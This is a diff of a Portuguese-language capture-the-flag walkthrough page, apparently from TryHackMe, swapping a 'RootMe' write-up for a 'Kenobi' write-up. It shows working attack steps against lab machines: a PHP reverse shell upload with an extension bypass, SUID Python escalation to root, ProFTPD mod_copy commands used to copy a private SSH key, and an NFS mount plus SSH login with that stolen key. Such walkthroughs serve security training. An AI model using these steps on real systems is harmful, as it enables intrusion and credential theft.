@@ -34,7 +34,7 @@
     <link href="../../css/styles.css" rel="stylesheet">
 
     <!-- Website Title -->
-    <title>RootMe</title>
+    <title>Kenobi</title>
     <!-- Favicon  -->
     <link rel="icon" href="../../images/logos/gc-favicon.png">
 </head>
@@ -138,10 +138,10 @@
                     <div class="col-lg-6">
                         <div class="text-container">
                             <h2>TryHackMe</h2>
-                            <h1 class="blue">RootMe</h1>
-                            <p class="p-large" style="margin-bottom: 0.5rem;"><i class="fas fa-link"></i> <a target="_blank" href="https://tryhackme.com/room/rrootme">tryhackme.com/room/rrootme</a></p>
-                            <p class="p-large" style="margin-bottom: 0.5rem;"><i class="fas fa-bolt"></i> <span class="green">Easy</span></p>
-                            <p><i class="fas fa-paragraph"></i> Reconhecimento | Enumeração | PHP Reverse Shell | SUID Priv Esc</p>
+                            <h1 class="blue">Kenobi</h1>
+                            <p class="p-large" style="margin-bottom: 0.5rem;"><i class="fas fa-link"></i> <a target="_blank" href="https://tryhackme.com/room/kenobi">tryhackme.com/room/kenobi</a></p>
+                            <p class="p-large" style="margin-bottom: 0.5rem;"><i class="fas fa-bolt"></i> <span class="yellow">Medium</span></p>
+                            <p><i class="fas fa-paragraph"></i> Reconhecimento | Enumeração | SMB (Samba) | FTP | SUID Priv Esc | PATH Manipulation</p>
                             <a style="margin-bottom: 0; font-size: larger;" target="ctf-walkthrough" class="event-cta btn-solid-lg page-scroll" href="#walkthrough"><i class="fas fa-list-ol"></i> WALKTHROUGH</a>
                         </div>
                     </div>
@@ -193,191 +193,497 @@
 
                     <!-- Section -->
                     <h2 class="blue"><i class="fas fa-terminal"></i> Alvo</h2>
-                    <p><b>Endereço IP:</b> 10.10.149.144</p>
+                    <p><b>Endereço IP:</b> 10.10.1.22</p>
 
                     <!-- Section -->
-                    <h2 style="margin-top: 4rem;" class="blue"><i class="fas fa-terminal"></i> Reconnaissance</h2>
+                    <h2 style="margin-top: 4rem;" class="blue"><i class="fas fa-terminal"></i> Deploy the Vulnerable Machine</h2>
 
-                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> Scan the machine, how many ports are open?</h4>
+                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> Scan the machine with nmap, how many ports are open?</h4>
                     <p>Primeiramente, realizo um scan padrão apenas para identificar quais portas estão abertas dentre as mais comuns.</p>
-                    <p class="code-block">$ <b class="command-line">nmap 10.10.149.144</b>
+                    <p class="code-block">$ <b class="command-line">nmap 10.10.1.22</b>
 
-Nmap scan report for 10.10.149.144
-Host is up (0.22s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 25.81 seconds</p>
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+80/tcp   open  http
+111/tcp  open  rpcbind
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+2049/tcp open  nfs</p>
 
                     <p>
-                        Identifiquei as 2 portas apertas (22 e 80).
+                        Identifiquei as 7 portas apertas (21, 22, 80, 111, 139, 445 e 2049).
                         <br>
                         Agora passo um scan mais agressivo para colher informações mais detalhadas sobre os serviços que estão rodando nessas portas.
                     </p>
-                    <p class="code-block">$ <b class="command-line">nmap 10.10.149.144 -p 22,80 -A</b>
+                    <p class="code-block">$ <b class="command-line">nmap 10.10.1.22 -A -p 21,22,80,111,139,445,2049</b>
 
-Nmap scan report for 10.10.149.144
-Host is up (0.35s latency).
-
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         ProFTPD 1.3.5
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
-|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
-|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
-|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-| http-cookie-flags: 
-|   /: 
-|     PHPSESSID: 
-|_      httponly flag not set
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: HackIT - Home
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
+|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
+|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
+80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/admin.html
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+2049/tcp open  nfs_acl     2-3 (RPC #100227)
+Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 19.45 seconds</p>
-
-                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> What version of Apache is running?</h4>
-                    <p>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</p>
-
-                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> What service is running on port 22?</h4>
-                    <p>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</p>
-
-                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> Find directories on the web server using the GoBuster tool.</h4>
-                    <p class="code-block">$ <b class="command-line">gobuster dir -t 50 -u http://10.10.149.144/ -e --no-error -r -w directory-list-lowercase-2.3-small.txt</b>
-
-===============================================================
-Gobuster v3.6
-===============================================================
-[+] Url:                     http://10.10.149.144/
-[+] Method:                  GET
-[+] Threads:                 50
-[+] Wordlist:                directory-list-lowercase-2.3-small.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Follow Redirect:         true
-[+] Expanded:                true
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-http://10.10.149.144/uploads        (Status: 200) [Size: 941]
-http://10.10.149.144/css            (Status: 200) [Size: 1126]
-http://10.10.149.144/js             (Status: 200) [Size: 959]
-http://10.10.149.144/panel          (Status: 200) [Size: 732]
-===============================================================
-Finished
-===============================================================</p>
-
-                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> What is the hidden directory?</h4>
-                    <p>
-                        Existem 2 diretórios interessantes aqui neste resultado:
-                        <br><b class="blue">- /panel/</b> que é de fato um painel "escondido" porque não existia referência para ele da página principal.
-                        <br><b class="blue">- /uploads/</b> onde provavelmente estarão possíveis arquivos que conseguirmos enviar para o servidor.
-                    </p>
-
-                    <img class="img-fluid walk-img" src="1.png">
-
-                    <p>Acessando o diretório <b class="blue">/panel/</b> me deparo com uma página de upload de arquivos.</p>
+Host script results:
+|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
+|_nbstat: NetBIOS name: KENOBI, NetBIOS user: unknown, NetBIOS MAC: unknown
+|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2023-10-19T23:10:06
+|_  start_date: N/A</p>
 
                     <!-- Section -->
-                    <h2 style="margin-top: 4rem;" class="blue"><i class="fas fa-terminal"></i> Getting a Shell</h2>
+                    <h2 class="blue"><i class="fas fa-terminal"></i> Enumerating Samba for Shares</h2>
 
-                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> Find a form to upload and get a reverse shell, and find the flag.</h4>
-                    
-                    <p>A primeira coisa que tentei foi fazer o upload de um arquivo de reverse shell em PHP (rev.php) para ser executado no servidor.</p>
-                    <p><i class="fas fa-link"></i> Referência <a target="_blank" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></p>
-                    <p>Porém aqui me deparei com um erro dizendo que a extensão .php não é permitida.</p>
+                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> Using the nmap command above, how many shares have been found?</h4>
+                    <p>O desafio propõe o uso dos scripts específicos do Nmap para enumerar o Samba de acordo com o seguinte comando:</p>
+                    <p class="code-block">$ <b class="command-line">nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.1.22</b></p>
+                    <p>Para fins didáticos, vou deixar aqui uma outra maneira de enumeração para os shares usando o <b class="blue">smbmap</b>:</p>
+                    <p class="code-block">$ <b class="command-line">smbmap -H 10.10.1.22</b>
 
-                    <img class="img-fluid walk-img" src="2.png">
+[+] Guest session   	IP: 10.10.1.22:445	Name: 10.10.1.22
 
-                    <p>Para fazer esse bypass, é possível alterar a extensão do arquivo para .php5</p>
-                    <p><i class="fas fa-link"></i> Referência <a target="_blank" href="https://book.hacktricks.xyz/pentesting-web/file-upload">book.hacktricks.xyz/pentesting-web/file-upload</a></p>
+Disk           Permissions    Comment
+----           -----------    -------
+print$         NO ACCESS      Printer Drivers
+anonymous      READ ONLY
+IPC$           NO ACCESS      IPC Service (kenobi server (Samba, Ubuntu))</p>
 
-                    <p class="code-block">$ <b class="command-line">mv rev.php rev.php5</b></p>
-                    <p>Agora faço o upload novamente, porém com sucesso.</p>
+                    <p>Foram encontrados 3 shares (print$, anonymous e IPC$)</p>
 
-                    <img class="img-fluid walk-img" src="3.png">
+                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> Once you're connected, list the files on the share. What is the file can you see?</h4>
+                    <p>O próximo passo é realizar a conexão usando o smbclient no share anonymous para inspecionarmos seu conteúdo.<br>Realizando então a conexão:</p>
+                    <p class="code-block">$ <b class="command-line">smbclient //10.10.1.22/anonymous</b>
+
+Password for [WORKGROUP\burton]:
+Try "help" to get a list of possible commands.
+smb: \></p>
+
+                    <p>Uma vez conectado, listo os arquivos do share, encontro o <b class="blue">log.txt</b> e então faço o download para minha máquina local:</p>
+                    <p class="code-block">smb: \> <b class="command-line">dir</b>
+.           D        0  Wed Sep  4 07:49:09 2019
+..          D        0  Wed Sep  4 07:56:07 2019
+log.txt     N    12237  Wed Sep  4 07:49:09 2019
+
+smb: \> <b class="command-line">get log.txt</b>
+getting file \log.txt of size 12237 as log.txt (10,2 KiloBytes/sec) (average 10,2 KiloBytes/sec)</p>
+
+                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> What port is FTP running on?</h4>
                     <p>
-                        Preciso agora executar esse arquivo PHP que foi feito o upload para o servidor.
+                        Analisando o conteúdo do arquivo, destaquei algumas informações algumas informações interessantes, como:<br>
+                        <br>> Geração de uma chave SSH no diretório /home/kenobi/.ssh
+                        <br>___ Chave Privada: /home/kenobi/.ssh/id_rsa
+                        <br>___ Chave Pública: /home/kenobi/.ssh/id_rsa.pub
+                        <br><br>> Dump do arquivo de configuração do ProFTPD (proftpd.conf)
+                        <br>___ Anonymous login habilitado
+                    </p>
+
+                    <p class="code-block">$ <b class="command-line">cat log.txt</b>
+
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
+<b class="code-detail">Created directory '/home/kenobi/.ssh'.</b>
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again:
+<b class="code-detail">Your identification has been saved in /home/kenobi/.ssh/id_rsa.</b>
+<b class="code-detail">Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.</b>
+The key fingerprint is:
+SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
+The key's randomart image is:
++---[RSA 2048]----+
+|                 |
+|           ..    |
+|        . o. .   |
+|       ..=o +.   |
+|      . So.o++o. |
+|  o ...+oo.Bo*o  |
+| o o ..o.o+.@oo  |
+|  . . . E .O+= . |
+|     . .   oBo.  |
++----[SHA256]-----+
+
+# This is a basic ProFTPD configuration file (rename it to 
+# 'proftpd.conf' for actual use.  It establishes a single server
+# and a single anonymous login.  It assumes that you have a user/group
+# "nobody" and "ftp" for normal operation and anon.
+
+ServerName			"ProFTPD Default Installation"
+ServerType			standalone
+DefaultServer			on
+
+<b class="code-detail"># Port 21 is the standard FTP port.</b>
+<b class="code-detail">Port				21</b>
+
+
+# Don't use IPv6 support by default.
+UseIPv6				off
+
+# Umask 022 is a good standard umask to prevent new dirs and files
+# from being group and world writable.
+Umask				022
+
+# To prevent DoS attacks, set the maximum number of child processes
+# to 30.  If you need to allow more than 30 concurrent connections
+# at once, simply increase this value.  Note that this ONLY works
+# in standalone mode, in inetd mode you should use an inetd server
+# that allows you to limit maximum number of processes per service
+# (such as xinetd).
+MaxInstances			30
+
+# Set the user and group under which the server will run.
+<b class="code-detail">User				kenobi</b>
+<b class="code-detail">Group				kenobi</b>
+
+# To cause every FTP user to be "jailed" (chrooted) into their home
+# directory, uncomment this line.
+#DefaultRoot ~
+
+# Normally, we want files to be overwriteable.
+AllowOverwrite		on
+
+# Bar use of SITE CHMOD by default
+Limit SITE_CHMOD
+  DenyAll
+/Limit
+
+# A basic anonymous configuration, no upload directories.  If you do not
+# want anonymous users, simply delete this entire Anonymous section.
+Anonymous ~ftp
+  User				ftp
+  Group				ftp
+
+  # We want clients to be able to login with "anonymous" as well as "ftp"
+  <b class="code-detail">UserAlias			anonymous ftp</b>
+
+  # Limit the maximum number of anonymous logins
+  MaxClients			10
+
+  # We want 'welcome.msg' displayed at login, and '.message' displayed
+  # in each newly chdired directory.
+  DisplayLogin			welcome.msg
+  DisplayChdir			.message
+
+  # Limit WRITE everywhere in the anonymous chroot
+  Limit WRITE
+    DenyAll
+  /Limit
+/Anonymous
+
+...
+..
+.</p>
+
+                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> What mount can we see?</h4>
+                    <p>O desafio propõe o uso dos scripts específicos do Nmap para enumerar o RPC Bind de acordo com o seguinte comando:</p>
+                    <p class="code-block">$ <b class="command-line">nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.1.22</b></p>
+                    <p>Para fins didáticos, vou deixar aqui uma outra maneira de enumeração para os shares usando o <b class="blue">showmount</b>:</p>
+                    <p class="code-block">$ <b class="command-line">showmount -e 10.10.1.22</b>
+Export list for 10.10.1.22:
+/var *</p>
+
+                    <!-- Section -->
+                    <h2 style="margin-top: 4rem;" class="blue"><i class="fas fa-terminal"></i> Gain Initial Access with ProFtpd</h2>
+
+                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> What is the version?</h4>
+                    <p>Podemos voltar no nosso port scanner com Nmap para ver que a versão do ProFTPD na porta 21 é é a 1.3.5</p>
+
+                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> How many exploits are there for the ProFTPd running?</h4>
+                    <p>Fiz uma busca usando o <b class="blue">searchsploit</b> e encontrei 4 exploits para essa versão do ProFTPD:</p>
+                    <p class="code-block">$ <b class="command-line">searchsploit ProFTPd 1.3.5</b>
+----------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                         |  Path
+----------------------------------------------------------------------- ---------------------------------
+ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)              | linux/remote/37262.rb
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                    | linux/remote/36803.py
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                | linux/remote/49908.py
+ProFTPd 1.3.5 - File Copy                                              | linux/remote/36742.txt
+----------------------------------------------------------------------- ---------------------------------</p>
+
+                    <p>
+                        Todos se tratam desse módulo chamado "mod_copy" onde é possível abusar do seu comportamento e copiar arquivos remotos no alvo vulnerável:
                         <br>
-                        É possível fazer isso por meio do diretório <b>/uploads/</b> que encontramos anteriormente.
+                        <i class="fas fa-link"></i> Referência <a target="_blank" href="http://www.proftpd.org/docs/contrib/mod_copy.html">proftpd.org/docs/contrib/mod_copy.html</a>
+                    </p>
+                    <i>"The mod_copy module implements SITE CPFR and SITE CPTO commands (analogous to RNFR and RNTO), which can be used to copy files/directories from one place to another on the server without having to transfer the data to the client and back."</i>
+
+                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> What is Kenobi's user flag (/home/kenobi/user.txt)?</h4>
+                    <p>
+                        Chegou a hora então de interligarmos todas essas informações do reconhecimento e enumeração do alvo que adiquirimos até o momento.
+                        <br>A estratégia vai ser a seguinte:
+                        <br><b class="blue">a. </b>Sabemos dessa vulnerabilidade de "mod_copy" no ProFTPD onde podemos copiar arquivos remotamente no alvo.
+                        <br><b class="blue">b. </b>Sabemos que o diretório /var está compartilhado
+                        <br><b class="blue">c. </b>Sabemos que existe uma chave SSH em /home/kenobi/.ssh/id_rsa
+                    </p>
+                    <p>
+                        Sabendo disso, o racional do ataque será conduzido da seguinte maneira:
+                        <br><b class="blue">1. </b>Copiar remotamente a chave SSH para o diretório /var usando o "mod_copy"
+                        <br><b class="blue">2. </b>Montar o diretório /var que está compartilhado
+                        <br><b class="blue">3. </b>Extrair a chave SSH do usuário "kenobi"
+                        <br><b class="blue">4. </b>Iniciar uma sessão SSH com o alvo
+                        <br><b class="blue">5. </b>Extrair a flag de usuário
                     </p>
 
-                    <p>Antes de executar o reverse shell, precisamos deixar o IP:PORT configurados no arquivo escutando a conexão reversa:</p>
-                    <p class="code-block">$ <b class="command-line">nc -lvnp 1337</b>
-Listening on 0.0.0.0 1337</p>
+                    <p>Então vamos lá:</p>
+                    <p><b class="blue">1. </b>Copiar remotamente a chave SSH para o diretório /var usando o "mod_copy"</p>
+                    <p class="code-block">$ <b class="command-line">nc 10.10.1.22 21</b>
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.1.22]
 
-                    <p>Com o netcat rodando, eu uso o cURL para fazer um resição que vai executar o nosso payload no servidor alvo:</p>
-                    <p class="code-block">$ <b class="command-line">curl http://10.10.149.144/uploads/rev.php5</b></p>
+<b class="command-line">SITE CPFR /home/kenobi/.ssh/id_rsa</b>
+350 File or directory exists, ready for destination name
 
-                    <p>Ao ser executado, o netcat recebe então a conexão do shell reverso interativo vinda do servidor alvo:</p>
-                    <p class="code-block">Connection received on 10.10.149.144 33244
-Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
-14:28:18 up 36 min,  0 users,  load average: 0.00, 0.00, 0.35
+<b class="command-line">SITE CPTO /var/tmp/id_rsa</b>
+250 Copy successful</p>
 
-$ <b class="command-line">id</b>
-uid=33(www-data) gid=33(www-data) groups=33(www-data)</p>
+                    <p><b class="blue">2. </b>Montar o diretório /var que está compartilhado</p>
+                    <p class="code-block">$ <b class="command-line">sudo mount -t nfs -o nolock 10.10.1.22:/var /tmp/kenobi/var</b>
+    
+$ <b class="command-line">ls -lah /tmp/kenobi/var</b>
+total 56K
+drwxr-xr-x 14 root   root   4,0K set  4  2019 .
+drwxr-xr-x  3 burton burton 4,0K out 19 20:25 ..
+drwxr-xr-x  2 root   root   4,0K set  4  2019 backups
+drwxr-xr-x  9 root   root   4,0K set  4  2019 cache
+drwxrwxrwt  2 root   root   4,0K set  4  2019 crash
+drwxr-xr-x 40 root   root   4,0K set  4  2019 lib
+drwxrwsr-x  2 root   staff  4,0K abr 12  2016 local
+lrwxrwxrwx  1 root   root      9 set  4  2019 lock -> /run/lock
+drwxrwxr-x 10 root   sgx    4,0K set  4  2019 log
+drwxrwsr-x  2 root   mail   4,0K fev 26  2019 mail
+drwxr-xr-x  2 root   root   4,0K fev 26  2019 opt
+lrwxrwxrwx  1 root   root      4 set  4  2019 run -> /run
+drwxr-xr-x  2 root   root   4,0K jan 29  2019 snap
+drwxr-xr-x  5 root   root   4,0K set  4  2019 spool
+drwxrwxrwt  6 root   root   4,0K out 19 20:06 tmp
+drwxr-xr-x  3 root   root   4,0K set  4  2019 www</p>
 
-                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> user.txt</h4>
-                    <p class="code-block">$ <b class="command-line">cat /var/www/user.txt</b>
-THM{y0**************ll}</p>
+                    <p><b class="blue">3. </b>Extrair a chave SSH do usuário "kenobi"</p>
+                    <p class="code-block">$ <b class="command-line">ls /tmp/kenobi/var/tmp</b>
+id_rsa
+systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
+systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
+systemd-private-930742d529f44be2b37f8a8c96cbf62b-systemd-timesyncd.service-PGjCUc
+systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn
+
+$ <b class="command-line">cp /tmp/kenobi/var/tmp/id_rsa ~/Downloads/kenobi/</b></p>
+
+                    <p><b class="blue">4. </b>Iniciar uma sessão SSH com o alvo</p>
+                    <p class="code-block">$ <b class="command-line">chmod 600 id_rsa</b>
+$ <b class="command-line">ssh kenobi@10.10.1.22 -i id_rsa</b>
+
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+103 packages can be updated.
+65 updates are security updates.
+
+Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+kenobi@kenobi:~$ <b class="command-line">id</b>
+uid=1000(kenobi) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)</p>
+
+                    <p><b class="blue">5. </b>Extrair e flag de usuário</p>
+                    <p class="code-block">kenobi@kenobi:~$ <b class="command-line">cat /home/kenobi/user.txt</b>
+d0**************************99</p>
 
                     <!-- Section -->
-                    <h2 style="margin-top: 4rem;" class="blue"><i class="fas fa-terminal"></i> Privilege Escalation</h2>
+                    <h2 style="margin-top: 4rem;" class="blue"><i class="fas fa-terminal"></i> Privilege Escalation with Path Variable Manipulation</h2>
 
-                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> Search for files with SUID permission, which file is weird?</h4>
-                    <p class="code-block">$ <b class="command-line">find / -type f -perm -u=s 2>/dev/null</b>
+                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> What file looks particularly out of the ordinary?</h4>
+                    <p>Como descrito no desafio, vamos procurar por binários com o SUID habilitado:</p>
+                    <p class="code-block">kenobi@kenobi:~$ <b class="command-line">find / -perm -u=s -type f 2>/dev/null</b>
 
+/sbin/mount.nfs
+/usr/lib/policykit-1/polkit-agent-helper-1
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 /usr/lib/snapd/snap-confine
-/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
 /usr/lib/eject/dmcrypt-get-device
 /usr/lib/openssh/ssh-keysign
-/usr/lib/policykit-1/polkit-agent-helper-1
-/usr/bin/traceroute6.iputils
-/usr/bin/newuidmap
-/usr/bin/newgidmap
-/usr/bin/chsh
-<b class="code-detail">/usr/bin/python</b>
-/usr/bin/at
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
 /usr/bin/chfn
-/usr/bin/gpasswd
-/usr/bin/sudo
-/usr/bin/newgrp
-/usr/bin/passwd
+/usr/bin/newgidmap
 /usr/bin/pkexec
-...
-/bin/mount
-/bin/su
+/usr/bin/passwd
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+<b class="code-detail">/usr/bin/menu</b>
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/newgrp
+/bin/umount
 /bin/fusermount
+/bin/mount
 /bin/ping
-/bin/umount</p>
+/bin/su
+/bin/ping6</p>
 
-                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> Find a form to escalate your privileges.</h4>
-                    <p>Se o binário do Python tiver o bit SUID setado (como é o caso), ele não descarta os privilégios elevados e pode ser abusado para acessar o sistema de arquivos, escalar ou manter o acesso privilegiado como um backdoor SUID.</p>
-                    <p><i class="fas fa-link"></i> Referência <a target="_blank" href="https://gtfobins.github.io/gtfobins/python/#suid">gtfobins.github.io/gtfobins/python/#suid</a></p>
+                    <p>Este binário <b class="blue">/usr/bin/menu</b> não é um binário padrão do sistema Linux.</p>
+                    <p class="code-block">kenobi@kenobi:~$ <b class="command-line">file /usr/bin/menu</b>
+/usr/bin/menu: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0928a845a7eef506cb3bb698377bf15bfd0dcb47, not stripped
+
+kenobi@kenobi:~$ <b class="command-line">ls -lah /usr/bin/menu</b>
+-rwsr-xr-x 1 root root 8.7K Sep  4  2019 /usr/bin/menu</p>
+
+                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> Run the binary, how many options appear?</h4>
+                    <p class="code-block">kenobi@kenobi:~$ <b class="command-line">/usr/bin/menu</b>
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :</p>
+
+                    <p>Explorando o comportamento das 3 opções disponíveis:</p>
+                    <p><b class="blue">1. </b>Status Check</p>
+                    <p class="code-block">kenobi@kenobi:~$ <b class="command-line">/usr/bin/menu</b>
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice : <b class="command-line">1</b>
+
+HTTP/1.1 200 OK
+Date: Thu, 19 Oct 2023 23:43:11 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
+ETag: "c8-591b6884b6ed2"
+Accept-Ranges: bytes
+Content-Length: 200
+Vary: Accept-Encoding
+Content-Type: text/html</p>
+
+                    <p><b class="blue">2. </b>Kernel Version</p>
+                    <p class="code-block">kenobi@kenobi:~$ <b class="command-line">/usr/bin/menu</b>
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice : <b class="command-line">2</b>
+
+4.8.0-58-generic</p>
+
+                    <p><b class="blue">3. </b>ifconfig</p>
+                    <p class="code-block">kenobi@kenobi:~$ <b class="command-line">/usr/bin/menu</b>
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice : <b class="command-line">3</b>
+
+eth0      Link encap:Ethernet  HWaddr 02:6c:18:98:3b:c5  
+          inet addr:10.10.1.22  Bcast:10.10.255.255  Mask:255.255.0.0
+          inet6 addr: fe80::6c:18ff:fe98:3bc5/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
+          RX packets:4929 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:4722 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:425298 (425.2 KB)  TX bytes:1123823 (1.1 MB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:202 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:202 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:15317 (15.3 KB)  TX bytes:15317 (15.3 KB)</p>
 
                     <p>
-                        Primeiramente eu uso o próprio Python para spwnar um Bash.
-                        <br>
-                        Em seguida, realizo e elevação de privilégios abusando o SUID.
+                        Analisando o comportamento do binário e também suas strings, é possível notar que cada uma das 3 opções executam um comando interno no sistema:
+                        <br><b class="blue">1. </b>curl
+                        <br><b class="blue">2. </b>uname -r
+                        <br><b class="blue">3. </b>ifconfig
                     </p>
+                    <p class="code-block">kenobi@kenobi:~$ <b class="command-line">strings /usr/bin/menu</b>
 
-                    <p class="code-block">$ <b class="command-line">python -c 'import pty;pty.spawn("/bin/bash")'</b>
-bash-4.4$
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+setuid
+__isoc99_scanf
+puts
+__stack_chk_fail
+printf
+system
+__libc_start_main
+__gmon_start__
+GLIBC_2.7
+GLIBC_2.4
+GLIBC_2.2.5
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :
+<b class="code-detail">curl -I localhost</b>
+<b class="code-detail">uname -r</b>
+<b class="code-detail">ifconfig</b>
+ Invalid choice
+;*3$"
+GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
+crtstuff.c
 
-bash-4.4$ <b class="command-line">/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'</b>
-#
+...
+..
+.</p>
 
-# <b class="command-line">id</b>
-uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)</p>
